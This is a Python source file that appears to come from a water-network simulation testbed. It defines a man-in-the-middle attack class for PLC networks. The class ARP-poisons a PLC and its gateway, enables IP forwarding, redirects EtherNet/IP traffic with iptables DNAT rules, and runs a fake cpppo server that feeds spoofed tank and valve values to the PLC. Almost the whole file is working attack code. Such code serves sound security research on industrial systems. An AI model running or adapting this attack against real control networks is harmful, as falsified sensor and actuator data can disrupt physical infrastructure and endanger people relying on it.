import argparse
import os
import shlex
import socket
import subprocess
import threading
import ctypes
import time
from pathlib import Path
from typing import List

import fnfqueue
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import translate_float_to_payload, translate_payload_to_float
from dhalsim.network_attacks.cip.cip import CIP
from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
from synced_attack import SyncedAttack


class MitmAttack(SyncedAttack):
    """
    This is a Man In The Middle attack class. This kind of attack will modify
    the data that is passed around in packages on the network, in order to
    change the values of tags before they reach the requesting PLC.

    A man in the middle attack always sits in between a PLC and its
    corresponding gateway.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')
        self.queue = fnfqueue.Connection()
        self.state = 0
        # self.q = None
        self.thread = None
        self.run_thread = False

    def setup(self):
        # Add the iptables rules
        # os.system('iptables -t nat -A POSTROUTING --destination 192.168.1.254 -j SNAT --to-source 192.168.1.1')
        # os.system('iptables -t nat -A POSTROUTING --destination 10.0.1.1/24 -j SNAT --to-source 192.168.1.1')
        # os.system('iptables -t nat -A POSTROUTING --destination 10.0.3.1/24 -j SNAT --to-source 192.168.1.1')
        os.system(
            'iptables -t nat -A PREROUTING -p tcp -d 192.168.1.1 --dport 44818 -j DNAT --to-destination 192.168.1.2:44818')
        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')

        print("MITM 💻:", "ip:", socket.gethostbyname(socket.gethostname()))

        cmd = shlex.split(
            "/usr/bin/python2 -m cpppo.server.enip --print --address 192.168.1.2:44818 T2:1=REAL V_ER2i:1=REAL")
        print("MITM 💻:", "server:", cmd)
        self.server = subprocess.Popen(cmd, shell=False)

        self.run_thread = True
        self.tags = {
            "T2": 0.1234500000,
            "V_ER2i": 1
        }
        self.thread = threading.Thread(target=self.cpppo_thread)
        self.thread.start()

        launch_arp_poison("192.168.1.1", "192.168.1.254")

    def make_client_cmd(self) -> List[str]:
        # cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
        #        str(self.intermediate_attack['local_ip'])]
        #
        # for tag in self.tags:
        #     cmd.append(str(tag) + ':1=' + str(self.tags[tag]))

        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address', '192.168.1.2',
               'T2:1=0.1234500000000000', 'V_ER2i:1=1']

        return cmd

    def cpppo_thread(self):
        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address', '192.168.1.2',
               'T2:1=0.1234500000000000', 'V_ER2i:1=1']
        while self.run_thread:
            print("MITM 💻:", "client:", cmd)
            try:
                client = subprocess.Popen(cmd, shell=False)
                client.wait()
            except Exception as error:
                print('ERROR enip _send multiple: ', error)
            time.sleep(0.05)

    def interrupt(self):
        if self.state == 1:
            self.teardown()

    def teardown(self):
        restore_arp("192.168.1.1", "192.168.1.254")

        # Delete iptables rules
        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

        self.run_thread = False
        self.thread.join()

    def attack_step(self):
        if self.state == 0:
            if self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                self.state = 1
                self.setup()
        elif self.state == 1:

            if not self.intermediate_attack["start"] <= self.get_master_clock() <= self.intermediate_attack["end"]:
                self.teardown()
                self.state = 2
        print("MITM 💻:", "state", self.state)


def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml", type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = MitmAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
